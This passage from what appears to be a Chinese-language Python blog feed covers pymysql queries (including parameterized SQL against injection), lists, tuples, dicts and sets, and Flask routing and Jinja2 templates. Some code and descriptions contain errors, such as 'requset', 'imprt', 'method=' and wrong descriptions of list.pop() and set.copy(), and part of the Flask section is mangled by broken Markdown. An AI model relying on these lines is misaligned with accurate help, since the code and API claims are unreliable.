pymysql.connect(host=<span class="hljs-string">&#x27;localhost&#x27;</span>,                     user=<span class="hljs-string">&#x27;testuser&#x27;</span>,                     password=<span class="hljs-string">&#x27;test123&#x27;</span>,                     database=<span class="hljs-string">&#x27;TESTDB&#x27;</span>) <span class="hljs-comment"># 使用 cursor() 方法创建一个游标对象 cursor</span>cursor = db.cursor() <span class="hljs-comment"># 使用 execute() 方法执行 SQL，如果表存在则删除</span>cursor.execute(<span class="hljs-string">&quot;DROP TABLE IF EXISTS EMPLOYEE&quot;</span>) <span class="hljs-comment"># 使用预处理语句创建表</span>sql = <span class="hljs-string">&quot;&quot;&quot;CREATE TABLE EMPLOYEE (</span><span class="hljs-string">         FIRST_NAME  CHAR(20) NOT NULL,</span><span class="hljs-string">         LAST_NAME  CHAR(20),</span><span class="hljs-string">         AGE INT,  </span><span class="hljs-string">         SEX CHAR(1),</span><span class="hljs-string">         INCOME FLOAT )&quot;&quot;&quot;</span> cursor.execute(sql) <span class="hljs-comment"># 关闭数据库连接</span>db.close()</code></pre></div><h1 id="使用预处理方法防止SQL注入"><a href="#使用预处理方法防止SQL注入" class="headerlink" title="使用预处理方法防止SQL注入"></a>使用预处理方法防止SQL注入</h1><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span> <span class="hljs-keyword">import</span> pymysql <span class="hljs-comment"># 打开数据库连接</span>db = pymysql.connect(host=<span class="hljs-string">&#x27;localhost&#x27;</span>,                     user=<span class="hljs-string">&#x27;testuser&#x27;</span>,                     password=<span class="hljs-string">&#x27;test123&#x27;</span>,                     database=<span class="hljs-string">&#x27;TESTDB&#x27;</span>) <span class="hljs-comment"># 使用 cursor() 方法创建一个游标对象 cursor</span>cursor = db.cursor() sql = <span class="hljs-string">&#x27;SELECT * FROM user where username = %s&#x27;</span> cursor.execute(sql,(username,))<span class="hljs-comment"># 关闭数据库连接</span>db.close()</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Mysql</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python-列表、元组、字典、集合</title>
    <link href="/Python-%E5%88%97%E8%A1%A8%E3%80%81%E5%85%83%E7%BB%84%E3%80%81%E5%AD%97%E5%85%B8%E3%80%81%E9%9B%86%E5%90%88/"/>
    <url>/Python-%E5%88%97%E8%A1%A8%E3%80%81%E5%85%83%E7%BB%84%E3%80%81%E5%AD%97%E5%85%B8%E3%80%81%E9%9B%86%E5%90%88/</url>
    
    <content type="html"><![CDATA[<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><ul><li>序列类型：列表、元组、字符串</li><li>映射类型：字典</li><li>集合类型：集合、冻结集合</li></ul><h1 id="列表-List"><a href="#列表-List" class="headerlink" title="列表 (List)"></a>列表 (List)</h1><blockquote><p>列表是Python中最灵活的有序的集合类型</p></blockquote><h2 id="列表的基本特性"><a href="#列表的基本特性" class="headerlink" title="列表的基本特性"></a>列表的基本特性</h2><ul><li>有序的集合，元素按照插入的顺序排列</li><li>可变，可以修改内容</li><li>可以包含任意类型的对象 , 可以嵌套使用</li><li>使用方括号[]，元素之间用逗号分隔</li></ul><p>eg :</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = [<span class="hljs-number">123</span>,<span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-number">1.2</span>,<span class="hljs-number">1e10</span>,[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]]</code></pre></div><h2 id="底层实现"><a href="#底层实现" class="headerlink" title="底层实现"></a>底层实现</h2><blockquote><p>列表实际上是一个动态数组，而不是链表</p><p>列表在内存中分配的空间通常比实际需要的多，这是为了优化追加的操作</p><p>平均世间复杂度为o(1)</p><p>列表元素在内存中不连续存储，列表只存储指向各个元素的指针</p></blockquote><h2 id="创建列表"><a href="#创建列表" class="headerlink" title="创建列表"></a>创建列表</h2><ul><li>普通方式</li></ul><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = []<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<span class="hljs-built_in">list</span>.append(i)</code></pre></div><ul><li>推导式</li></ul><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)]<span class="hljs-comment">##带有条件的情况</span><span class="hljs-built_in">list</span> = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>) <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>]</code></pre></div><h2 id="列表的输出"><a href="#列表的输出" class="headerlink" title="列表的输出"></a>列表的输出</h2><blockquote><p>与字符串的索引一样，列表索引从0开始，第二个索引为1，最后一个元素的索引也可以是-1</p></blockquote><ul><li>直接输出</li></ul><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]<span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)</code></pre></div><ul><li>访问列表中的值</li></ul><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]<span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>[<span class="hljs-number">1</span>])</code></pre></div><ul><li>截取字符串</li></ul><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]<span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>[<span class="hljs-number">1</span>:<span class="hljs-number">3</span>])</code></pre></div><h2 id="更新列表"><a href="#更新列表" class="headerlink" title="更新列表"></a>更新列表</h2><blockquote><p>使用 append() 方法</p></blockquote><p>eg：</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]<span class="hljs-built_in">list</span>.append(<span class="hljs-number">7</span>)<span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)</code></pre></div><h2 id="删除列表元素"><a href="#删除列表元素" class="headerlink" title="删除列表元素"></a>删除列表元素</h2><blockquote><ol><li>使用del语句</li><li>使用 remove() 方法</li><li>使用 pop() 方法</li></ol></blockquote><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]<span class="hljs-built_in">list</span>.pop(<span class="hljs-number">1</span>)<span class="hljs-keyword">del</span> <span class="hljs-built_in">list</span>[<span class="hljs-number">1</span>]<span class="hljs-built_in">list</span>.remove(<span class="hljs-number">1</span>)<span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)</code></pre></div><h2 id="列表脚本操作符"><a href="#列表脚本操作符" class="headerlink" title="列表脚本操作符"></a>列表脚本操作符</h2><table><thead><tr><th>表达式</th><th>描述</th></tr></thead><tbody><tr><td>len([1,2,3])</td><td>长度</td></tr><tr><td>[1,2,3]+[4,5,6]</td><td>组合</td></tr><tr><td>[1]*4</td><td>重复</td></tr><tr><td>3 in [1,2,3]</td><td>元素是否存在列表中</td></tr><tr><td>for x in [1,2,3]:print(x,end&#x3D;” “)</td><td>迭代</td></tr></tbody></table><h2 id="列表常用函数-方法"><a href="#列表常用函数-方法" class="headerlink" title="列表常用函数&amp;方法"></a>列表常用函数&amp;方法</h2><ul><li>python 包含一下函数</li></ul><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>len()</td><td>列表元素个数</td></tr><tr><td>max()</td><td>返回最大值</td></tr><tr><td>min()</td><td>返回最小值</td></tr><tr><td>list(seq)</td><td>将元组转换为列表</td></tr></tbody></table><ul><li>python 包含以下方法</li></ul><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>list.append()</td><td>在列表末尾追加新的对象</td></tr><tr><td>list.count()</td><td>统计某个元素在列表中出现的次数</td></tr><tr><td>list.extend()</td><td>在列表末尾一次性追加另一个序列中的多个值</td></tr><tr><td>list.index()</td><td>从列表中找出某个值第一个匹配项的索引位置</td></tr><tr><td>list.insert(index, obj)</td><td>将对象插入列表</td></tr><tr><td>list.pop()</td><td>移除列表中第一个元素（默认最后一个元素），并且返回该元素的值</td></tr><tr><td>list.remove()</td><td>移除列表中某个值的第一个匹配项</td></tr><tr><td>list.reverse()</td><td>反向列表中的元素</td></tr><tr><td>list.sort(key&#x3D;None,reverse&#x3D;False)</td><td>对列表进行排序</td></tr><tr><td>list.clear()</td><td>清空列表</td></tr><tr><td>list.copy()</td><td>复制</td></tr></tbody></table><h1 id="元组（Tuple）"><a href="#元组（Tuple）" class="headerlink" title="元组（Tuple）"></a>元组（Tuple）</h1><blockquote><p>元组与列表类似，不同之处在于元组的元素不能修改</p><p>元组使用 () 小括号，列表使用方括号 []</p><p>元组创建很简单，只需要在括号中添加元素，并使用逗号隔开</p></blockquote><p>eg：</p><div class="code-wrapper"><pre><code class="hljs python">tup1 = (<span class="hljs-string">&quot;Google&quot;</span>,<span class="hljs-string">&quot;baidu&quot;</span>,<span class="hljs-string">&quot;github&quot;</span>,<span class="hljs-string">&quot;bing&quot;</span>)</code></pre></div><p>创建空元组</p><div class="code-wrapper"><pre><code class="hljs python">tup1 = ()</code></pre></div><blockquote><p>注意：当元组中只包含一个元素时，需要在元素后面加逗号. 否则括号会被当做运算符使用</p></blockquote><h2 id="访问元组"><a href="#访问元组" class="headerlink" title="访问元组"></a>访问元组</h2><p>和列表一样，元组可以使用下标索引来访问元组中的值</p><p>eg：</p><div class="code-wrapper"><pre><code class="hljs python">tup1 = (<span class="hljs-string">&quot;Google&quot;</span>,<span class="hljs-string">&quot;baidu&quot;</span>,<span class="hljs-string">&quot;github&quot;</span>,<span class="hljs-string">&quot;bing&quot;</span>)<span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;tup1[0]: &quot;</span>, tup1[<span class="hljs-number">0</span>])</code></pre></div><h2 id="修改元组"><a href="#修改元组" class="headerlink" title="修改元组"></a>修改元组</h2><blockquote><p>元组中的元素是不允许被修改的，但是可以对元组进行连接组合</p></blockquote><p>eg：</p><div class="code-wrapper"><pre><code class="hljs python">tup1 = (<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)tup2 = (<span class="hljs-number">4</span>,<span class="hljs-number">5</span>)<span class="hljs-comment">#tup1[0]=0  这种操作是非法的</span>tup3 = tup1 + tup2</code></pre></div><h2 id="删除元组"><a href="#删除元组" class="headerlink" title="删除元组"></a>删除元组</h2><blockquote><p>元组中的元素值不允许被删除，但是可以使用del 语句来删除整个元组</p></blockquote><p>eg：</p><div class="code-wrapper"><pre><code class="hljs python">tup1 = (<span class="hljs-string">&quot;Google&quot;</span>,<span class="hljs-string">&quot;baidu&quot;</span>,<span class="hljs-string">&quot;github&quot;</span>,<span class="hljs-string">&quot;bing&quot;</span>)<span class="hljs-keyword">del</span> tup1</code></pre></div><h2 id="元组的运算"><a href="#元组的运算" class="headerlink" title="元组的运算"></a>元组的运算</h2><blockquote><p>与字符串一样，元组之间可以使用 +、+&#x3D;、*号进行运算</p></blockquote><p>eg： 复制</p><div class="code-wrapper"><pre><code class="hljs python">tup1 = (<span class="hljs-string">&quot;asd&quot;</span>,)*<span class="hljs-number">4</span></code></pre></div><h2 id="元组的内置函数"><a href="#元组的内置函数" class="headerlink" title="元组的内置函数"></a>元组的内置函数</h2><blockquote><p>基本和列表相同，不再赘述</p></blockquote><p>计算个数、最大值、最小值</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>tuple(iterable)</td><td>将可迭代系列转换为元组</td></tr></tbody></table><h1 id="字典（Dict）"><a href="#字典（Dict）" class="headerlink" title="字典（Dict）"></a>字典（Dict）</h1><blockquote><p>字典是另一种可变容器模型，且可存储任意类型对象</p><p>字典的每个键值 key&#x3D;&gt;value 用冒号:分割，每个对之间用逗号分隔，整个字典包括在花括号中</p></blockquote><div class="code-wrapper"><pre><code class="hljs python">d = &#123;key1 : value1, key2 : value2, key3 : value3 &#125;</code></pre></div><blockquote><p>注意：dict作为python的关键字和内置函数，变量名不建议命名为dict</p></blockquote><p>键 必须是唯一的，但值不必</p><p>值可以取任何数据类型，但键必须是不可变的，如字符串，数字</p><div class="code-wrapper"><pre><code class="hljs python">tinydict = &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;runoob&#x27;</span>, <span class="hljs-string">&#x27;likes&#x27;</span>: <span class="hljs-number">123</span>, <span class="hljs-string">&#x27;url&#x27;</span>: <span class="hljs-string">&#x27;www.runoob.com&#x27;</span>&#125;</code></pre></div><h2 id="创建空字典"><a href="#创建空字典" class="headerlink" title="创建空字典"></a>创建空字典</h2><ul><li>使用花括号 {} 创建空字典</li></ul><div class="code-wrapper"><pre><code class="hljs python">emptyDict = &#123;&#125;</code></pre></div><ul><li>使用内置函数 dict() 创建空字典</li></ul><div class="code-wrapper"><pre><code class="hljs python">emptyDict = <span class="hljs-built_in">dict</span>()</code></pre></div><h2 id="访问字典中的值"><a href="#访问字典中的值" class="headerlink" title="访问字典中的值"></a>访问字典中的值</h2><div class="code-wrapper"><pre><code class="hljs python">tinydict = &#123;<span class="hljs-string">&#x27;Name&#x27;</span>: <span class="hljs-string">&#x27;Runoob&#x27;</span>, <span class="hljs-string">&#x27;Age&#x27;</span>: <span class="hljs-number">7</span>, <span class="hljs-string">&#x27;Class&#x27;</span>: <span class="hljs-string">&#x27;First&#x27;</span>&#125; <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;tinydict[&#x27;Name&#x27;]: &quot;</span>, tinydict[<span class="hljs-string">&#x27;Name&#x27;</span>])<span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;tinydict[&#x27;Age&#x27;]: &quot;</span>, tinydict[<span class="hljs-string">&#x27;Age&#x27;</span>])</code></pre></div><h2 id="修改字典"><a href="#修改字典" class="headerlink" title="修改字典"></a>修改字典</h2><div class="code-wrapper"><pre><code class="hljs python">tinydict = &#123;<span class="hljs-string">&#x27;Name&#x27;</span>: <span class="hljs-string">&#x27;Runoob&#x27;</span>, <span class="hljs-string">&#x27;Age&#x27;</span>: <span class="hljs-number">7</span>, <span class="hljs-string">&#x27;Class&#x27;</span>: <span class="hljs-string">&#x27;First&#x27;</span>&#125; tinydict[<span class="hljs-string">&#x27;Age&#x27;</span>] = <span class="hljs-number">8</span>               <span class="hljs-comment"># 更新 Age</span>tinydict[<span class="hljs-string">&#x27;School&#x27;</span>] = <span class="hljs-string">&quot;菜鸟教程&quot;</span>  <span class="hljs-comment"># 添加信息</span></code></pre></div><h2 id="删除字典中的元素"><a href="#删除字典中的元素" class="headerlink" title="删除字典中的元素"></a>删除字典中的元素</h2><ul><li>使用del 语句删除字典</li></ul><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 删除键‘Name’</span><span class="hljs-keyword">del</span> qweDict[<span class="hljs-string">&#x27;Name&#x27;</span>]<span class="hljs-comment"># 删除整个字典</span><span class="hljs-keyword">del</span> qweDict</code></pre></div><blockquote><p>del 删除后整个字典不再存在</p></blockquote><ul><li>清空字典</li></ul><div class="code-wrapper"><pre><code class="hljs python">qweDict.clear()</code></pre></div><h2 id="字典键的特性"><a href="#字典键的特性" class="headerlink" title="字典键的特性"></a>字典键的特性</h2><ul><li>不允许同一个键出现两次，创建时同一个键如果被赋值两次，后一个值会被记住</li><li>键必须不可变，所以可以用数字，字符串或元组充当，而列表就不行</li></ul><h2 id="字典内置函数-方法"><a href="#字典内置函数-方法" class="headerlink" title="字典内置函数&amp;方法"></a>字典内置函数&amp;方法</h2><ul><li>python字典包含以下内置函数</li></ul><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>len()</td><td>计算元素个数</td></tr><tr><td>str()</td><td>输出字典</td></tr><tr><td>type()</td><td>返回输入的变量类型，如果变量是字典，就返回字典类型</td></tr></tbody></table><ul><li>python字典包含以下内置方法</li></ul><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>dict.clear()</td><td>删除字典内所有元素</td></tr><tr><td>dict.copy()</td><td>返回一个字典的浅复制</td></tr><tr><td>dict.formkeys()</td><td>创建一个新的字典，以序列seq中元素做字典的键，val为字典所有键对应的初始值</td></tr><tr><td>dict.get(key, default&#x3D;None)</td><td>返回执行键的值，如果键不在字典中返回default 设置的默认值</td></tr><tr><td>key in dict</td><td>如果键在字典返回true，否返回false</td></tr><tr><td>dict.items()</td><td>以列表返回一个试图对象</td></tr><tr><td>dict.keys()</td><td>返回一个试图对象</td></tr><tr><td>dict.setdefault(key,dafault&#x3D;None)</td><td>和get()类似，但如果键不在字典中，将回添加键并将值设为default</td></tr><tr><td>dict.update(dict2)</td><td>把字典dict2的键值对更新到dict中</td></tr><tr><td>dict.values()</td><td>返回一个试图对象</td></tr><tr><td>dict.pop(key)</td><td>删除字典key所对应的值，并返回被删除的值</td></tr><tr><td>dict.popitem()</td><td>返回并删除字典中最后一对键和值</td></tr></tbody></table><h1 id="集合（Set）"><a href="#集合（Set）" class="headerlink" title="集合（Set）"></a>集合（Set）</h1><blockquote><p>集合是一个无序的不重复的元素序列</p><p>集合中的元素不会重复，并且可以进行交集，并集，差集等常见的集合操作</p><p>可以使用花括号{}创建集合，元素之间用逗号，分隔，或者也可以使用set()函数创建</p></blockquote><p>eg：</p><div class="code-wrapper"><pre><code class="hljs python">set1 = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;set2 = <span class="hljs-built_in">set</span>([<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>])</code></pre></div><blockquote><p>注意：创建空集合时必须用set()函数，因为 {} 用来创建一个空字典</p></blockquote><h2 id="集合内置方法整合表"><a href="#集合内置方法整合表" class="headerlink" title="集合内置方法整合表"></a>集合内置方法整合表</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>add()</td><td>为集合添加元素</td></tr><tr><td>clear()</td><td>移除集合中的所有元素</td></tr><tr><td>copy()</td><td>拷贝多个集合的差集</td></tr><tr><td>difference()</td><td>返回多个集合的差集</td></tr><tr><td>difference_update()</td><td>移除集合中的元素，该元素在指定的集合中也存在</td></tr><tr><td>discard()</td><td>删除集合中指定的元素</td></tr><tr><td>intersection()</td><td>返回集合的交集</td></tr><tr><td>intersection_update()</td><td>返回集合的交集</td></tr><tr><td>isdisjoint()</td><td>判断两个集合是否包含相同的元素，如果没有返回 True，否则返回False</td></tr><tr><td>issubset()</td><td>判断指定集合是否为该方法参数集合的子集</td></tr><tr><td>issuperset()</td><td>判断该方法的参数集合是否为指定集合的子集</td></tr><tr><td>pop()</td><td>随机移除元素</td></tr><tr><td>remove()</td><td>移除指定元素</td></tr><tr><td>symmetric_difference()</td><td>返回两个集合中不重复的元素集合</td></tr><tr><td>sysmmetric_difference_update()</td><td>移除当前集合中在另外一个指定集合中相同的元素，并将另外一个指定集合中不同的元素插入到当前集合中</td></tr><tr><td>union()</td><td>返回两个集合的并集</td></tr><tr><td>update()</td><td>给集合添加元素</td></tr><tr><td>len()</td><td>计算集合元素的个数</td></tr></tbody></table>]]></content>
    
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>开发</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python开发-Flask框架</title>
    <link href="/Python%E5%BC%80%E5%8F%91-Flask%E6%A1%86%E6%9E%B6/"/>
    <url>/Python%E5%BC%80%E5%8F%91-Flask%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><blockquote><p>pip install flask</p></blockquote><h1 id="基础入门"><a href="#基础入门" class="headerlink" title="基础入门"></a>基础入门</h1><ul><li>实例化一个Flask对象，创建一个路由，实现一个基本的页面</li></ul><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flaskapp = Flask(__name__)<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello world&quot;</span><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:     <span class="hljs-comment">#当py文件被执行时，if下面的代码块将被运行</span>    <span class="hljs-comment">#当py文件以模块形式被导入时，下面的代码块不被运行</span>    app.debug = <span class="hljs-literal">True</span>   <span class="hljs-comment">#开启调试模式，修改完代码之后不必重启程序</span>    app.run()</code></pre></div><p>route 之后的字符串表示拼接到 <code>localhost:5000</code> 后面的参数</p><p>&lt;&gt; 之中的传参可以带入到页面当中</p><ul><li>指定一个路由</li></ul><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/name/&lt;name&gt;&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><span class="hljs-comment">#method 指定传参方式 POST或者GET方式</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">putName</span>(<span class="hljs-params">name</span>):  <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Hello <span class="hljs-subst">&#123;name&#125;</span>&#x27;</span></code></pre></div><h2 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h2><ul><li>首先引入 request</li></ul><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request</code></pre></div><ul><li>GET 方式接受传参</li></ul><div class="code-wrapper"><pre><code class="hljs python">request.args.get(<span class="hljs-string">&#x27;传参变量名&#x27;</span>)</code></pre></div><ul><li>POST 方式接受传参</li></ul><div class="code-wrapper"><pre><code class="hljs python">request.form(<span class="hljs-string">&#x27;传参变量名&#x27;</span>)</code></pre></div><p>eg：</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/method&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>) </span><span class="hljs-comment"># methods 表示可以接受的传参方式</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">method</span>():<span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:        name = requset.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;GET !!!&quot;</span> + name<span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:        name = request.form[<span class="hljs-string">&#x27;name&#x27;</span>]<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;POST !!!&quot;</span> + name</code></pre></div><h1 id="redirect-重定向"><a href="#redirect-重定向" class="headerlink" title="redirect 重定向"></a>redirect 重定向</h1><ul><li>引入 redirect 和 url_for</li></ul><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask imprt Flask,request,redirect,url_for</code></pre></div><p>eg:</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>,method=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():key = <span class="hljs-string">&quot;123456&quot;</span>UserKey = request.args.get(<span class="hljs-string">&#x27;key&#x27;</span>)<span class="hljs-keyword">if</span> UserKey == key:<span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login_ed&#x27;</span>))<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login_ed&#x27;</span>,method=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><span class="hljs-comment">#定义一个新的页面</span></code></pre></div><h1 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h1><ul><li>首先在项目目录下建一个  <code>template</code> 文件夹，建立 html文件</li></ul><div class="code-wrapper"><pre><code class="hljs jinja2">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h1&gt;Hello &#123;&#123;name&#125;&#125;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></div><ul><li>渲染 index.html 的同时 向文件传参 将name变量渲染</li></ul><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,render_template<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/name/&lt;name&gt;&#x27;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">name</span>):  <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,name=name)</code></pre></div><h2 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h2><ul><li>编写base页面</li></ul><div class="code-wrapper"><pre><code class="hljs jinja2">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;&#123;% block title %&#125;BasePage&#123;% endblock %&#125;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &#123;% block content %&#125;main&#123;% endblock %&#125;    homepage&lt;/body&gt;&lt;/html&gt;</code></pre></div><ul><li>编写 test1.html</li></ul><div class="code-wrapper"><pre><code class="hljs jinja2">&#123;% extends &quot;base.html&quot; %&#125;&#123;% block title %&#125;Home Page&#123;% endblock %&#125;&#123;% block content %&#125;&lt;h2&gt;Welcome to the Home Page!&lt;/h2&gt;&lt;p&gt;Hello &#123;&#123;name&#125;&#125;&lt;/p&gt;&#123;% endblock %&#125;</code></pre></div><h2 id="控制结构"><a href="#控制结构" class="headerlink" title="控制结构"></a>控制结构</h2><ul><li>分支结构</li></ul><div class="code-wrapper"><pre><code class="hljs jinja2">&#123;% if name == &quot;Lixiney&quot; %&#125;&lt;p&gt;Hello admin&lt;/p&gt;&#123;% else %&#125;&lt;p&gt;Hello &#123;&#123;name&#125;&#125;&lt;/p&gt;&#123;% endif %&#125;</code></pre></div><ul><li>循环结构</li></ul><div class="code-wrapper"><pre><code class="hljs jinja2">&#123;% for person in name %&#125;&lt;p&gt;&#123;&#123;person&#125;&#125;&lt;/p&gt;&lt;br&gt;&#123;% endfor %&#125;</code></pre></div><h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><blockquote><p>过滤器用于在模板中格式化和处理变量数据</p></blockquote><div class="code-wrapper"><pre><code class="hljs jinja2">&lt;p&gt;&#123;&#123; name|capitalize &#125;&#125;&lt;/p&gt;&lt;p&gt;&#123;&#123; price|round(2) &#125;&#125;&lt;/p&gt;</code></pre></div><div class="code-wrapper"><pre><div class="caption"><span>name|capitalize &#125;&#125;``` 将 name 变量的值首字母大写</span></div><code class="hljs &#123;&#123;">```&#123;&#123; price|round(2) &#125;&#125;``` 将 price 变量的值四舍五入到小数点后两位## 宏和模板包含&gt; 在一个模板中插入另一个模板的内容* 创建宏创建 templates/macos.html```jinja2&#123;% macro render_item(item) %&#125;    &lt;div&gt;        &lt;h3&gt;&#123;&#123; item.title &#125;&#125;&lt;/h3&gt;        &lt;p&gt;&#123;&#123; item.description &#125;&#125;&lt;/p&gt;    &lt;/div&gt;&#123;% endmacro %&#125;</code></pre></div><ul><li>使用宏</li></ul><p>创建 templates&#x2F;index.html</p><div class="code-wrapper"><pre><code class="hljs jinja2">&#123;% from &quot;macros.html&quot; import render_item %&#125;&lt;h1&gt;Items&lt;/h1&gt;&#123;% for item in items %&#125;    &#123;&#123; render_item(item) &#125;&#125;&#123;% endfor %&#125;</code></pre></div><h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><blockquote><p>用户输入的内容会被自动转义，以避免恶意代码注入</p></blockquote><div class="code-wrapper"><pre><code class="hljs jinja2">&lt;p&gt;&#123;&#123; user_input &#125;&#125;&lt;/p&gt;</code></pre></div><h2 id="模板上下文"><a href="#模板上下文" class="headerlink" title="模板上下文"></a>模板上下文</h2><ul><li>传入一个字典类型</li></ul><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span 